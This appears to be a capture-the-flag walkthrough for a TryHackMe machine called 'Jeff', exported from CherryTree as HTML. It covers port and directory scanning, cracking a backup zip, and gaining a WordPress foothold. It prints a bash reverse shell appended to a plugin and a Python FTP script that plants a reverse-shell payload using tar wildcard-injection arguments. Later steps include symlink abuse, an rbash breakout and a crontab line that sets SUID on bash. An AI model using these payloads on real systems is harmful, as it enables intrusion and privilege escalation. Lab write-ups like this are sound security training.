<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>jeff</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>jeff</h1><br/><strong><h1>THM: Jeff</h1></strong><br /><br /><strong><h2>Enumeration</h2></strong><br /><br /><strong><span style="text-decoration:underline;">Rustscan</span></strong><br /><br /><strong>rustscan -a 10.10.161.232</strong><br /><br /><img src="images/57-1.png" alt="images/57-1.png" /><br /><br /><strong><span style="text-decoration:underline;">Nmap</span></strong><br /><br /><strong>nmap -p22,80 -A 10.10.161.232</strong><br /><br /><img src="images/57-2.png" alt="images/57-2.png" /><br /><br /><strong><span style="text-decoration:underline;">Website Enumeration</span></strong><br /><br />When we open the website using IP, we get a blank page.<br /><img src="images/57-3.png" alt="images/57-3.png" /><br /><br />Upon viewing its source, we found the info to add <strong>jeff.thm</strong> to our <strong>hosts</strong> file.<br /><br /><img src="images/57-4.png" alt="images/57-4.png" /><br /><br />We add it.<br /><br /><strong>sudo echo &quot;10.10.161.232		jeff.thm&quot; &gt;&gt; /etc/hosts</strong><br /><br />Next, we opened the website <strong> http://jeff.thm</strong><br /><br /><img src="images/57-5.png" alt="images/57-5.png" /><br /><br /><br /><strong><span style="text-decoration:underline;">Directory Enumeration</span></strong><br /><br /><strong>gobuster dir -u http://jeff.thm -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 64</strong><br /><br /><img src="images/57-6.png" alt="images/57-6.png" /><br /><br />/uploads contains a form which doesn’t do anything<br />/admin gives us an empty login.php file<br />/source_codes gives us also an empty file<br />/backups directory contains a file which has actual data in it.<br /><br /><img src="images/57-7.png" alt="images/57-7.png" /><br /><br />To find out if any files exists, we need to use gobuster &amp; a wordlist.<br />To find it we have to look for extensions which are often used for backups, like <strong>zip, tar, gzip</strong> etc<br /><br /><strong>gobuster dir -u http://jeff.thm/backups -x zip,tar,gzip -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 64</strong><br /><br /><img src="images/57-8.png" alt="images/57-8.png" /><br /><br />We got a file named “<strong>backup.zip</strong>”<br />To Download it we can use the URL: <strong>http://jeff.thm/backups/backup.zip</strong> <br /><br />I downloaded it &amp; tried to open. It seems it is password protected.<br />I tried to crack it.<br />We can use <strong>john</strong> Or <strong>fcrackzip</strong> to crack the password.<br /><br />I will use <strong>fcrackzip</strong><br /><br /><strong>fcrackzip -v -D -p /usr/share/wordlists/rockyou.txt backup.zip</strong><br /><br /><img src="images/57-9.png" alt="images/57-9.png" /><br /><br /><strong><span style="text-decoration:underline;">Zip File Enumeration</span></strong><br /><br />I unzipped the file with the found password &amp; checked its contents.<br /><br /><img src="images/57-10.png" alt="images/57-10.png" /><br /><br />we found the wordpress password in the <strong>wpadmin.bak</strong> file<br /><br /><img src="images/57-11.png" alt="images/57-11.png" /><br /><br />Seeing this backup directory, we guess that maybe jeff has already setup his wordpress CMS. I decided to enumerate subdomains using gobuster.<br /><br /><strong><span style="text-decoration:underline;">Subdomain Enumeration</span></strong><br /><br /><strong>gobuster vhost -u http://jeff.thm -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 64</strong><br /><br /><img src="images/57-12.png" alt="images/57-12.png" /><br /><br />We found a subdomain <strong>wordpress.jeff.thm</strong> <br />I removed the old entry &amp; added this to /etc/hosts<br /><br /><strong>sudo echo “10.10.161.232		jeff.thm	wordpress.jeff.thm” &gt;&gt; /etc/hosts</strong><br /><br /><strong><span style="text-decoration:underline;">Wordpress Site Enumeration</span></strong><br /><br />URL: <strong>http://wordpress.jeff.thm</strong> <br /><br /><img src="images/57-13.png" alt="images/57-13.png" /><br /><br />Next, we Login into wordpress by going to the link:<strong> http://wordpress.jeff.thm/wp-login.php</strong><br /><br /><img src="images/57-14.png" alt="images/57-14.png" /><br /><br />We can login using Username as <strong>jeff</strong> &amp; password as the one we found in the backup file.<br /><br /><br /><strong><h2>Foothold</h2></strong><br /><br /><img src="images/57-15.png" alt="images/57-15.png" /><br /><br />Most of the time we can manipulate <strong>theme</strong> templates like the <strong>404.php-page</strong> to get a reverse shell with wordpress, but this isn’t possible in this case. (<strong>It did not work</strong>)<br />So we’ll use a <strong>plugin</strong> which isn’t activated yet and supports php.<br />In our case this will be <strong>Hello Dolly.</strong><br /><br /><img src="images/57-16.png" alt="images/57-16.png" /><br /><br />Go to &quot;<strong>Plugin Editor</strong>&quot; select the <strong>Hello Dolly</strong> at right top &amp; then append the reverse shell at the end.<br /><br /><strong>exec(&quot;/bin/bash -c &#39;bash -i &gt; /dev/tcp/10.11.72.31/7777 0&gt;&amp;1&#39;&quot;);</strong><br /><br /><img src="images/57-17.png" alt="images/57-17.png" /><br /><br />Next, we click on <strong>Update File</strong><br />Start a Netcat Listner.<br /><br /><strong>nc -lvnp 7777</strong><br /><br />Next, we activate the plugins.<br /><img src="images/57-18.png" alt="images/57-18.png" /><br /><br /><br />We check the listner.<br /><img src="images/57-19.png" alt="images/57-19.png" /><br /><br />Foothold was successful.<br /><br /><strong><h2>Lateral Movement &amp; Privilege Escalation</h2></strong><br /><br />We checked that we are inside a container.<br /><strong>.dockerenv </strong>file present in <strong>/</strong> directory<br /><br />Next, I checked the <strong>/var/www/html</strong> directory &amp; found an intresting file <strong>ftp_backup.php</strong><br /><br /><img src="images/57-20.png" alt="images/57-20.png" /><br /><br />The file has FTP credentials &amp; an indication that FTP is only accessible to internal Network.<br />Here, we can do <strong>Port Forwarding</strong>, but I will do this with a <strong>python script</strong>.<br /><br /><strong>Python Script</strong><br />#############################<br />from ftplib import FTP<br />import io<br /><br />with FTP(host=&#39;172.20.0.1&#39;) as ftp:<br />	print(str(ftp.getwelcome()))<br />	try:<br />		ftp.login(user=&#39;<strong>backupmgr</strong>&#39;, passwd=&#39;<strong>&lt;password&gt;</strong>&#39;)<br />		print(&quot;[+] Login successful!&quot;)<br />		ftp.set_pasv(False)<br />		print(&quot;[+] Mode set to \&quot;active\&quot;&quot;)<br />		print(&quot;[*] Working directory: &quot; + str(ftp.pwd()))<br />		print(&quot;[*] Listing directory&quot;)<br />		ftp.dir()<br />		print(&quot;[*] Trying to change into the  \&quot;files\&quot; directory.&quot;)<br />		ftp.cwd(&#39;files&#39;)<br />		print(&quot;[+] Successfully changed directory!&quot;)<br />		<br />		# Want to Delete files in this directory?<br />		#ftp.delete(&#39;&#39;)<br />		#print(&quot;[+] Deleted the files.&quot;)<br />		<br />		# Now we want to create the payloads and upload everything!<br />		print(&quot;[*] Trying to create the files!&quot;)<br />		shell = io.BytesIO(b&#39;python3 -c \&#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;<strong>[your IP]</strong>&quot;,<strong>[PORT]</strong>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);\&#39;&#39;)<br />		emptyFile = io.BytesIO(b&#39;&#39;)<br />                ftp.storlines(&#39;STOR shell.sh&#39;, shell)<br />		ftp.storlines(&#39;STOR --checkpoint=1&#39;, emptyFile)<br />		ftp.storlines(&#39;STOR --checkpoint-action=exec=sh shell.sh&#39;, emptyFile)<br />		print(&quot;[+] Success!&quot;)<br />		<br /><br />		print(&quot;[*] These files are now in the directory \&quot;&quot; + str(ftp.pwd()) + &quot;\&quot;&quot;)<br />		ftp.dir()<br /><br />		# Want to check if the payload is correct?<br />		#print(&quot;Payload:\n&quot;)<br />		#print(str(ftp.retrlines(&quot;RETR shell.sh&quot;)))<br /><br />		print(&quot;[+] Closing FTP connection&quot;)<br />		ftp.quit()<br />		<br /><br />	except Exception as e:<br />		print(&#39;FTP error: &#39;, e)<br />#############################<br /><br /><strong>Explanation</strong><br /><br />    ▸ We are creating a connection to the server and login with the username and password we found in the ftp_backup.php file<br />    ▸ It’s important to set ftp.set_pasv(False), because this results in using the ftp active mode. If we don’t do this the default value is taken, which is passive mode and this doesn’t work on this machine.<br />    ▸ ftp.dir() shows that there is only one directory: /files in which we change in the next step<br />    ▸ io.BytesIO() is used to create our files, one is an empty dummy and one contains our reverse shell<br />    ▸ We are using a python reverse shell. It’s important to use python3 and not python3.7! I did this at first and haven’t gotten a shell back.<br />    ▸ The most important part is --checkpoint=1 and --checkpoint-action=exec=sh shell.sh<br /><br />Why does this work? Whats happening outside the container? A crontab is running outside the container! The user backupmgr is running tar every few minutes and uses a <strong>wildcard *</strong> to include everything in the ftp://files directory.<br />In this case the usage of wildcard is dangerous and makes this exploit possible, because our files --checkpoint=1 and --checkpoint-action=exec=sh shell.sh are interpreted as arguments of the tar command!<br />This means that after 1 proccessed file the checkpoint is reached. The checkpoints action is sh shell.sh which then invokes our python3 payload and we can catch the reverse shell with nc.<br /><br />Make Necessary Changes to the Python Code(Password, IP, Port), Then copy the code into the system &amp; Start Netcat Listener.<br />Finally, run the Python Script.<br /><br /><img src="images/57-21.png" alt="images/57-21.png" /><br /><br />Next, we check that a user named jeff exists. Lets find all files belonging to him.<br /><br /><strong>find / -user jeff 2&gt;/dev/null</strong><br /><br /><br /><img src="images/57-22.png" alt="images/57-22.png" /><br /><br />I see that, if we need to  be <strong>jeff</strong> or <strong>pwman</strong> to read the file<br /><br /><img src="images/57-23.png" alt="images/57-23.png" /><br /><br />We see that the program <strong>systool</strong> has GUID set. (ie. It would be run as group <strong>pwman</strong>)<br />We need to find a way to exploit this.<br /><br /><img src="images/57-24.png" alt="images/57-24.png" /><br /><br />The tool has above options.<br />When run with <strong>ltrace</strong> &amp; select option <strong>2</strong>, we see a file named <strong>message.txt</strong> is read<br /><br /><img src="images/57-25.png" alt="images/57-25.png" /><br /><br />Luckily, the file has permissions.<br /><br /><img src="images/57-26.png" alt="images/57-26.png" /><br /><br />Let’s rename, delete or move the existing <strong>message.txt</strong> and replace it with a symbolic link to <strong>/var/backups/jeff.bak</strong><br /><br /><strong>ln -s /var/backups/jeff.bak message.txt</strong><br /><br />Then run the program &amp; select 2<br />It will read this file.<br /><br /><img src="images/57-27.png" alt="images/57-27.png" /><br /><br />We got Jeff&#39;s Password.<br />If we normally do <strong>su</strong> into<strong> jeff</strong> we get a <strong>rbash</strong> (Restricted Bash)<br /><br /><strong>Use the following to Break out of (rbash)Restricted Bash</strong>:<br /><br /><strong>su -l jeff -c &quot;/bin/bash -i&quot;</strong><br /><br />This will still <strong>PATH</strong> not properly set.<br /><br />Example: We need to use <strong>/bin/cat</strong> For <strong>cat</strong><br /><strong>Note:</strong> We can run a python shell &amp; have unrestricted access.<br /><br />Or<br /><br />Use <strong>SSH</strong> to get full bash access as follows:<br /><br /><strong>ssh jeff@10.10.1.126 -t bash &#39;--noprofile&#39;<br /></strong><br />Get the user flag in <strong>jeff&#39;s</strong> home directory.<br /><br /><img src="images/57-28.png" alt="images/57-28.png" /><br /><br /><br />As we have crontab in sudo, we can easily get into root.<br /><br />We will edit the crontab by<br /><br /><strong>sudo /usr/bin/crontab -e</strong><br /><br />&amp; add the following line.<br /><br /><strong>* * * * * chmod u+s /bin/bash</strong><br /><br />After a minute, we will have a <strong>bash</strong> executible with <strong>SUID</strong> set<br /><br /><img src="images/57-29.png" alt="images/57-29.png" /><br /><br />Thus, we have root access. We get the root flag in /root directory.<br /><br />Thanks!!</div>
</body>
</html>
